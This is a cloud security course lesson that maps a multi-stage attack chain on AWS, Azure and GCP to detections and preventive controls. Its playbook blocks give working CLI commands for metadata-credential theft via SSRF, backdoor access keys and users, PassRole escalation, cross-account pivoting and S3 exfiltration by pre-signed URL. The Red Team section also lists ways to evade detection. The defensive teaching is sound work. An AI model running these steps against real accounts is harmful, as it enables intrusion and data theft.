# 11 — Building a Simple APT

> **Level:** Advanced
> **Prereqs:** Modules 02–08; [Methodology & PTES For Cloud](methodology-and-PTES-for-cloud.md) through [Evasion & Trail Free Actions](evasion-and-trail-free-actions.md)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** All — this is the capstone that maps the full kill chain
**Authorization scope:** Run only against your own sandbox accounts / sanctioned engagement with written authorization. This lesson builds a framework — pseudocode and narrative only, no operational binaries. All targets, ARNs, accounts use placeholders.

## What & why
A "simple APT" in cloud is a structured, multi-stage attack playbook that chains reconnaissance, initial access, persistence, privilege escalation, lateral movement, collection, C2, and exfiltration — using only cloud-native primitives. Building the *framework* teaches the attacker's decision tree and, critically, reveals exactly which detection rules and preventive controls break each step. This is the capstone of the offense module: design the playbook, then map every stage to its defense.

## The OnPrem reality
The canonical on-prem APT narrative (Mandiant APT1) involved phishing → remote access trojan → credential dumping → lateral movement via RDP → data staging → exfiltration via FTP. Each stage relied on custom malware and network pivoting. Cloud APTs replace malware with IAM operations and network pivoting with trust-chain traversal.

## Core concepts

### APT lifecycle block diagram

```
┌──────────┐   ┌──────────────┐   ┌────────────┐   ┌──────────────┐   ┌──────────┐
│  Recon   │──▶│ Initial       │──▶│ Persistence │──▶│ Privilege    │──▶│ Lateral  │
│          │   │ Access        │   │             │   │ Escalation   │   │ Movement │
└──────────┘   └──────────────┘   └────────────┘   └──────────────┘   └──────────┘
                                                                           │
                                                                           ▼
┌──────────┐   ┌──────────────┐   ┌────────────┐   ┌──────────────┐   ┌──────────┐
│  Impact  │◀──│ Exfiltration │◀──│ Collection  │◀──│ C2           │◀──│ Discovery│
└──────────┘   └──────────────┘   └────────────┘   └──────────────┘   └──────────┘
```

### Defense mapping: every offensive step has a countermeasure

| Kill Chain Phase | Offensive Action | Defensive Countermeasure | Module Reference |
|---|---|---|---|
| Recon | `ListRoles`, `ListUsers`, `GetAccountAuthorizationDetails` | CloudTrail `List*` burst alert; GuardDuty; honeytokens | 09-02 |
| Initial Access | SSRF → IMDS credential theft; leaked key from git | IMDSv2 enforcement; `git-secrets` pre-commit; GuardDuty InstanceCredentialExfiltration | 09-03 |
| Persistence | `CreateAccessKey` on admin user; EventBridge + Lambda backdoor | SCP denying `CreateAccessKey`; alert on `CreateFunction` outside CI | 09-07 |
| Privilege Escalation | `iam:PassRole` + `lambda:CreateFunction` with admin role | SCP restricting `PassRole`; `CreateFunction` alert for non-CI roles | 09-05 |
| Credential Access | `CreateAccessKey` on higher-priv user; STS session theft | MFA requirement for `AssumeRole`; short STS TTL via SCP | 09-04 |
| Discovery | `DescribeInstances`, `ListBuckets`, `GetParametersByPath` | VPC Flow Logs; CloudTrail Insights anomaly detection | 09-02 |
| Lateral Movement | `AssumeRole` chain across 3 accounts | Cross-account `AssumeRole` alert; `ExternalId` requirement | 09-06 |
| Collection | `s3 sync` to staging bucket; DynamoDB scan | S3 data events; anomalous bytes-out alert | 09-09 |
| C2 | Lambda + SQS message broker | Alert on new SQS queue + Lambda event source mapping | 09-10 |
| Exfiltration | Pre-signed S3 URL download | S3 data events; VPC Flow Log byte-count anomaly; DNS exfil detection | 09-09 |
| Impact | `DeleteBucket`, `TerminateInstances`, `DisableAccessKey` | S3 Object Lock; termination protection; MFA delete | 09-08 |

## AWS APT playbook

### Phase 1: Recon (silent)

```
OBJECTIVE: Enumerate the account without triggering alerts.
TARGET: Single AWS account 111111111111.

ACTIONS:
1. aws sts get-caller-identity
   → Confirms account ID, principal ARN. CloudTrail: GetCallerIdentity.

2. aws iam list-roles --max-items 50
   → Enumerate roles. Note trust policies that accept external accounts.
   CloudTrail: ListRoles.

3. aws organizations list-accounts
   → Discover sibling accounts. If successful, the account is in an org.
   CloudTrail: ListAccounts (if org member).

4. aws s3 ls (against guessed bucket names)
   → Passive: DNS resolution only. No CloudTrail events for failed attempts.
   → Active: for buckets you can access, ListBucket event logged.

ARTIFACTS: 5–15 CloudTrail management events from a single principal in 60 seconds.
```

**Defense that breaks this step:**
- CloudTrail Insights detects the `List*` burst anomaly.
- GuardDuty `Recon:IAMUser/MaliciousIPCaller.Custom` fires if from known-bad IP.
- Honeytoken IAM role with trust to a canary account triggers on `ListRoles`.
- See: [09-02-recon-osint-and-fingerprint.md](./recon-osint-and-fingerprint.md)

### Phase 2: Initial Access

```
OBJECTIVE: Obtain valid credentials for a role with useful permissions.
VECTOR: SSRF → IMDS on a web application instance.

ACTIONS:
1. Discover web app at https://app.example.com.
2. Find SSRF in /proxy?url= parameter.
3. Use SSRF to hit http://169.254.169.254/latest/meta-data/iam/security-credentials/app-server-role.
4. Receive AccessKeyId (ASIA...), SecretAccessKey, SessionToken.
5. Verify: aws sts get-caller-identity (now as app-server-role).
6. Session TTL: 6 hours (default instance profile session duration).

ARTIFACTS:
- SSRF requests in application access logs.
- GetCallerIdentity from a new source IP (the attacker's workstation, or a proxy).
- If credentials are used from outside AWS: GuardDuty InstanceCredentialExfiltration.
```

**Defense that breaks this step:**
- IMDSv2 enforced (`HttpTokens=required`) → SSRF cannot get credentials with simple GET.
- WAF rule blocking requests to `169.254.169.254`.
- GuardDuty `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration`.
- See: [09-03-initial-access-vectors.md](./initial-access-vectors.md)

### Phase 3: Persistence

```
OBJECTIVE: Create durable access that survives credential rotation.
VECTOR: Create a second access key on a legitimate admin user.

ACTIONS:
1. aws iam list-users → identify high-priv users (based on attached policies).
2. aws iam create-access-key --user-name admin-jdoe
3. Store AKIA... key externally. This key has NO TTL.

ARTIFACTS:
- CreateAccessKey CloudTrail event under admin-jdoe's user page.
- admin-jdoe now has 2 active access keys.
```

**Defense that breaks this step:**
- SCP denies `iam:CreateAccessKey` for all IAM users.
- Daily inventory script detects users with >1 access key.
- Alert on `CreateAccessKey` event for any human user.
- See: [09-07-persistence-techniques-in-cloud.md](./persistence-techniques-in-cloud.md)

### Phase 4: Privilege Escalation

```
OBJECTIVE: Escalate from app-server-role to AdministratorAccess.
VECTOR: PassRole → Lambda function.

PREREQS: app-server-role must have:
  - iam:PassRole on arn:aws:iam::111111111111:role/lambda-admin-role
  - lambda:CreateFunction
  - lambda:InvokeFunction

ACTIONS:
1. aws iam simulate-principal-policy --policy-source-arn app-server-role-arn --action-names iam:PassRole
   → Check if PassRole is allowed to an admin role.

2. Package Lambda code that creates a backdoor IAM user.
3. aws lambda create-function --function-name log-processor \
     --role arn:aws:iam::111111111111:role/lambda-admin-role \
     --runtime python3.9 --handler index.handler --zip-file fileb://func.zip

4. aws lambda invoke --function-name log-processor /dev/null
   → Lambda runs as lambda-admin-role, creates backdoor user.

5. aws iam list-users --query 'Users[?CreateDate>=`2026-06-22`].UserName'
   → Confirm backdoor user created.

ARTIFACTS:
- CreateFunction, InvokeFunction, CreateUser, CreateAccessKey — 4 CloudTrail events.
- Chain: app-server-role → CreateFunction (PassRole to admin) → InvokeFunction → CreateUser.
```

**Defense that breaks this step:**
- SCP restricts `iam:PassRole` to specific role→service pairs.
- SCP denies `lambda:CreateFunction` outside CI/CD roles.
- Alert on `CreateFunction` with admin role ARN.
- See: [09-05-privilege-escalation-catalogue.md](./privilege-escalation-catalogue.md)

### Phase 5: Lateral Movement

```
OBJECTIVE: Pivot from account A (111111111111) to account B (222222222222).
VECTOR: AssumeRole chain.

PREREQS: A role in account A can assume a role in account B (cross-account trust).

ACTIONS:
1. From app-server-role in account A:
   aws sts assume-role --role-arn arn:aws:iam::222222222222:role/cross-account-read \
     --role-session-name data-sync

2. Now operating in account B:
   aws sts get-caller-identity → Account: 222222222222
   aws s3 ls → enumerate account B's S3 buckets
   aws iam list-roles → find further pivots in account B

3. If cross-account-read can assume another role to account C, chain continues.

ARTIFACTS:
- AssumeRole event in account A (source) and account B (target).
- Cross-account event with recipientAccountId != userIdentity.accountId.
```

**Defense that breaks this step:**
- All cross-account trust policies require `sts:ExternalId`.
- Alert on cross-account AssumeRole → AssumeRole (chain depth ≥ 2).
- SCP blocks AssumeRole from non-corporate IPs.
- See: [09-06-lateral-movement-and-pivoting.md](./lateral-movement-and-pivoting.md)

### Phase 6: Collection & Exfiltration

```
OBJECTIVE: Exfiltrate data from account B's S3 bucket.
VECTOR: Pre-signed URL.

ACTIONS:
1. aws s3 sync s3://prod-data-bucket/customers/ s3://staging-temp-bucket/exfil/
   → Stage data in a region not normally used.

2. Generates pre-signed URLs for staged data:
   aws s3 presign s3://staging-temp-bucket/exfil/customers.csv --expires-in 43200

3. Download exfil data from an external host:
   curl -o customers.csv "https://staging-temp-bucket.s3.amazonaws.com/exfil/customers.csv?X-Amz-..."

4. Delete staging bucket:
   aws s3 rb s3://staging-temp-bucket --force

ARTIFACTS:
- GetObject + PutObject S3 data events (if enabled).
- Pre-signed URL download: S3 GetObject from external IP.
- DeleteBucket management event.
- VPC Flow Log: anomalous bytes-out to S3 endpoint.
```

**Defense that breaks this step:**
- S3 data events enabled → all GetObject/PutObject visible.
- VPC endpoints with endpoint policies restricting S3 access.
- Alert on bytes-out from S3 > 100 MB in 1 hour from a single principal.
- Alert on bucket creation + deletion within 24 hours.
- See: [09-09-collection-data-exfil-channels.md](./collection-data-exfil-channels.md)

## Azure APT playbook (high-level)

```
PHASE 1 — Recon:
  - curl https://login.microsoftonline.com/example-tenant.onmicrosoft.com/.well-known/openid-configuration
  - az ad user list --top 10 (if credentials available)
  - Search public blob containers via subdomain brute-force

PHASE 2 — Initial Access:
  - Phish admin user → capture credentials + MFA (via Evilginx-style proxy)
  - OR: SSRF → Azure IMDS → Managed Identity token

PHASE 3 — Persistence:
  - Register a new app registration with broad API permissions
  - Add a password credential to an existing privileged SP
  - Create a Logic App with recurrence trigger that maintains access

PHASE 4 — Privilege Escalation:
  - If Application Administrator: add secret to a privileged SP → authenticate as that SP
  - If Contributor + Microsoft.Authorization: assign Owner to self at subscription scope

PHASE 5 — Lateral Movement:
  - Discover cross-tenant B2B guest access
  - Use Azure Lighthouse delegated resource management to pivot subscriptions
  - az account tenant list → switch to target tenant

PHASE 6 — Collection & Exfiltration:
  - Stage data in Storage Account in different region
  - Generate SAS token with read + list permissions
  - Download via HTTPS (blob.core.windows.net)
  - Delete staging storage account

DETECTION FOR EACH PHASE:
  Recon: SignInLogs anomaly; Azure AD audit for unusual Graph API enumeration
  IA: Risky sign-in detection; impossible travel; unfamiliar sign-in properties
  Persist: Add application password; Add service principal credentials audit events
  Privesc: Role assignment creation audit; PIM activation outside business hours
  Lateral: Cross-tenant sign-in; administrative unit scope traversal
  Exfil: Storage analytics GetBlob from external IP; large data egress
```

## GCP APT playbook (high-level)

```
PHASE 1 — Recon:
  - gcloud projects list (if org-level access)
  - gcloud projects get-iam-policy example-project
  - gcloud iam service-accounts list
  - Search public GCS buckets via bucket name brute-force

PHASE 2 — Initial Access:
  - SSRF → GCE metadata server → default SA access token
  - OR: Leaked SA key JSON from public repo
  - gcloud auth activate-service-account --key-file=leaked-key.json

PHASE 3 — Persistence:
  - Create a new SA with editor role
  - Create an extra key on an existing privileged SA
  - Deploy a Cloud Function triggered by Pub/Sub topic (silent trigger)
  - Cloud Scheduler job that re-creates access hourly

PHASE 4 — Privilege Escalation:
  - If iam.serviceAccounts.getAccessToken on a higher-priv SA: impersonate it
  - If iam.serviceAccounts.createKey: create a permanent key for privileged SA
  - If resourcemanager.projects.setIamPolicy: grant self owner

PHASE 5 — Lateral Movement:
  - gcloud projects list → enumerate sibling projects
  - For each project: gcloud projects get-iam-policy → find trusted SAs
  - Impersonate SAs with cross-project permissions

PHASE 6 — Collection & Exfiltration:
  - Stage in GCS bucket in different region
  - gcloud storage sign-url gs://staging-bucket/data.csv --duration=12h
  - Download via HTTPS (storage.googleapis.com)
  - Delete staging bucket

DETECTION FOR EACH PHASE:
  Recon: Admin Activity audit: ListServiceAccounts, GetIamPolicy bursts
  IA: Data Access audit: metadata server token usage; new SA key authentication
  Persist: CreateServiceAccountKey; CreateServiceAccount; CreateFunction
  Privesc: GenerateAccessToken on high-priv SA; SetIamPolicy with owner binding
  Lateral: IAM policy reads across multiple projects in short window
  Exfil: Data Access audit: storage.objects.get from external IP; large byte count
```

## OnPrem mapping (recap table)

| APT Phase | OnPrem | AWS | Azure | GCP |
|---|---|---|---|---|
| Recon | Shodan, DNS, SNMP | `ListRoles`, `ListAccounts`, `cloudfox` | `az ad user list`, `crt.sh` | `get-iam-policy`, `gcloud projects list` |
| Initial Access | Phishing, RDP brute, exploit | SSRF→IMDS, leaked key, public bucket | SSRF→IMDS, consent phishing, leaked SP secret | SSRF→metadata, leaked SA key |
| Persistence | Registry Run, scheduled task, AD account | `CreateAccessKey`, EventBridge+Lambda | New SP secret, Logic App recurrence | New SA key, Cloud Scheduler+Function |
| Privilege Escalation | Kernel exploit, SeRestorePrivilege | `PassRole`+Lambda, `AssumeRole` chain | App Admin→SP secret→Global Admin | `getAccessToken` on privileged SA |
| Lateral Movement | PsExec, pass-the-hash | Cross-account `AssumeRole` chain | Cross-tenant B2B, Lighthouse | Cross-project SA impersonation |
| Collection | File share enumeration | `s3 sync` to staging bucket | `az storage blob copy` | `gsutil cp` to staging bucket |
| Exfiltration | FTP, HTTPS POST to C2 | Pre-signed S3 URL | Blob SAS URL | GCS signed URL |

## 🔴 Red Team view

### Cross-flow APT lifecycle (full diagram with traces)

```
RECON ─────────────────────────────────────────────────────────────────
│  Actions: ListRoles, ListUsers, ListAccounts, DescribeInstances, S3 bucket discovery
│  Traces: CloudTrail management events; User-Agent string; source IP
│  Detection-breakers: Use existing credentials (reduce new IAM activity);
│    spread recon over 24h (avoid burst); use data-plane reads where possible
│
▼
INITIAL ACCESS ────────────────────────────────────────────────────────
│  Actions: SSRF→IMDS; git credential scrape; OAuth consent grant
│  Traces: GetCallerIdentity from new IP; InstanceCredentialExfiltration (GuardDuty);
│    new app consent grant in Azure AD audit
│  Detection-breakers: Use IMDSv2-compatible attack (steal after SSRF upgrades to v2);
│    use credential within same VPC (no external IP)
│
▼
PERSISTENCE ───────────────────────────────────────────────────────────
│  Actions: CreateAccessKey; UpdateAssumeRolePolicy; CreateEventSourceMapping
│  Traces: CreateUser + CreateAccessKey event pair; trust policy modification;
│    new Lambda trigger creation
│  Detection-breakers: Add key to existing user (no new user); modify trust to
│    accept existing service (not new account); use scheduled rule name that blends
│
▼
PRIVESC ───────────────────────────────────────────────────────────────
│  Actions: PassRole+CreateFunction; AssumeRole without conditions;
│    AttachRolePolicy AdministratorAccess
│  Traces: CreateFunction with admin role; AssumeRole with no MFA/ExternalId;
│    AttachRolePolicy event
│  Detection-breakers: Use Glue DevEndpoint (less monitored than Lambda);
│    escalate via UpdateFunctionConfiguration (modify existing fn, don't create)
│
▼
LATERAL ───────────────────────────────────────────────────────────────
│  Actions: Cross-account AssumeRole; cross-tenant B2B guest sign-in;
│    cross-project SA impersonation
│  Traces: AssumeRole chain depth > 2; cross-tenant SignInLogs;
│    GenerateAccessToken for SAs in other projects
│  Detection-breakers: Use resource-based trust (S3 bucket policy) instead of
│    AssumeRole; use VPC peering for network-level lateral (fewer IAM logs)
│
▼
COLLECTION → C2 → EXFIL ──────────────────────────────────────────────
│  Actions: s3 sync; pre-signed URL; SQS+Lambda C2; SES SendEmail
│  Traces: S3 data events (GetObject, PutObject); VPC Flow Log bytes-out;
│    SES sending spikes; DNS TXT record query spikes
│  Detection-breakers: Use CloudFront+S3 (CDN IP masks source); spread exfil
│    over 7 days in sub-100MB chunks; use multiple staging buckets with CDN-like names
│
▼
IMPACT ────────────────────────────────────────────────────────────────
│  Actions: DeleteBucket; TerminateInstances; DisableAccessKey; RDS DeleteDBInstance
│  Traces: Massive CloudTrail burst of destructive events
│  Detection-breakers: N/A — impact is the loudest phase by design
```

## 🔵 Blue Team view

### Three detections per kill chain phase

| Phase | Detection 1 | Detection 2 | Detection 3 |
|---|---|---|---|
| Recon | CloudTrail `List*` burst (>20/min) | GuardDuty `Recon:IAMUser` | Honeytoken key usage alert |
| Initial Access | GuardDuty `InstanceCredentialExfiltration` | `GetCallerIdentity` from new IP | OAuth consent grant alert (Azure) |
| Persistence | `CreateAccessKey` for IAM user | `UpdateAssumeRolePolicy` event | `CreateFunction` outside CI role |
| Privilege Escalation | `CreateFunction` with admin role | `AssumeRole` without MFA | `AttachRolePolicy` AdministratorAccess |
| Lateral Movement | Cross-account `AssumeRole` chain | Cross-tenant sign-in (Azure) | `GenerateAccessToken` on external SA (GCP) |
| Collection | S3 `GetObject` burst (>100 in 1h) | S3 bucket created then deleted <24h | `s3:ListBucket` on buckets never accessed before |
| Exfiltration | VPC Flow Log bytes-out >1 GB | S3 `GetObject` from non-corporate IP | SES sending spike >100% baseline |
| C2 | New SQS queue + Lambda ESM | `StartSession` from non-corp IP | Cloud Shell start from new user/IP |

### Native threat detection services

| Service | AWS | Azure | GCP |
|---|---|---|---|
| **Managed threat detection** | GuardDuty | Microsoft Defender for Cloud | Security Command Center (SCC) |
| **Anomaly detection** | CloudTrail Insights | Azure AD Identity Protection | SCC Event Threat Detection |
| **Vulnerability scanning** | Inspector | Defender for Cloud (TVM) | SCC Security Health Analytics |
| **Network monitoring** | VPC Flow Logs + GuardDuty | NSG Flow Logs + Sentinel | VPC Flow Logs + SCC |
| **IAM analysis** | IAM Access Analyzer | Azure AD Identity Protection | IAM Recommender + Policy Analyzer |

## Hands-on lab

**Objective:** Map a complete APT chain and identify every CloudTrail event at each stage.

1. **On paper/markdown:** Design a 7-phase AWS APT playbook for your sandbox account `111111111111`.

2. **For each phase, list:**
   - The exact AWS CLI command or API call
   - The expected CloudTrail `eventName`
   - Which GuardDuty finding (if any) would fire
   - Which SCP would break the step
   - The cross-reference lesson that covers the defense

   Example row:
   ```
   Phase 3 — Persistence: aws iam create-access-key --user-name admin-jdoe
   → eventName: CreateAccessKey
   → GuardDuty: N/A (IAM user key creation not a GuardDuty finding)
   → SCP: Deny iam:CreateAccessKey for user/*
   → Defense lesson: 09-07, Section "Detection signals #1"
   ```

3. **Chart the full kill chain** as a table with columns: Phase, Action, eventName, GuardDuty Finding, SCP Mitigation, Defense Lesson Reference.

**Expected output:** A single markdown table with 20–30 rows mapping every offensive action to its detection and prevention.

**Teardown:** No infrastructure created — this is a paper exercise.

## Detection rules & checklists

### Composite detection: APT kill chain progression

```yaml
title: APT Kill Chain Progression Detected
status: experimental
description: Detects multiple APT phases in sequence from the same principal within 24h
logsource:
  product: aws
  service: cloudtrail
detection:
  recon:
    - ListRoles|count > 5
    - ListUsers
    - GetAccountAuthorizationDetails
  initial_access:
    - GetCallerIdentity from new IP
  persistence:
    - CreateAccessKey
    - CreateUser
  privesc:
    - CreateFunction with Admin role
    - AttachUserPolicy AdministratorAccess
  lateral:
    - AssumeRole across accounts
  exfil:
    - GetObject > 100 MB
  timeframe: 24h
  condition: recon and initial_access and (persistence or privesc) and (lateral or exfil)
level: critical
```

### Master checklist for blue team

- [ ] CloudTrail enabled in all regions, all accounts
- [ ] CloudTrail data events for S3, DynamoDB, Lambda, KMS, Secrets Manager
- [ ] GuardDuty enabled in all regions
- [ ] CloudTrail Insights enabled
- [ ] SCPs: deny `CreateAccessKey` for users, restrict `PassRole`, cap STS duration, require MFA for `AssumeRole`
- [ ] ExternalId required on all cross-account trust policies
- [ ] SSM session logging enabled
- [ ] Daily IAM inventory diff (users, roles, keys, trust policies)
- [ ] VPC Flow Logs enabled, exported to SIEM
- [ ] Honeytokens deployed (IAM keys, S3 buckets, SPs, SAS tokens)
- [ ] Alert on: `StopLogging`, `DeleteTrail`, `DeleteDetector`, `DisableSecurityHub`
- [ ] Azure: all diagnostic settings enabled, Activity Log → Sentinel
- [ ] GCP: Data Access audit enabled, log sink → SIEM

## References

- [MITRE ATT&CK Cloud Matrix](https://attack.mitre.org/matrices/enterprise/cloud/)
- [AWS Security Incident Response Guide](https://docs.aws.amazon.com/whitepapers/latest/aws-security-incident-response-guide/welcome.html)
- [Azure Security Operations Guide](https://learn.microsoft.com/en-us/azure/security/fundamentals/operational-security)
- [GCP Security Best Practices](https://cloud.google.com/security/best-practices)
- [Mandiant APT1 Report](https://www.mandiant.com/resources/apt1-exposing-one-of-chinas-cyber-espionage-units)
- See also: [09-01 through 09-10](./) (full module)
- See also: [labs/linchpin-lab.md](./labs/linchpin-lab.md)
- See also: [labs/simple-apt-lab.md](./labs/simple-apt-lab.md)
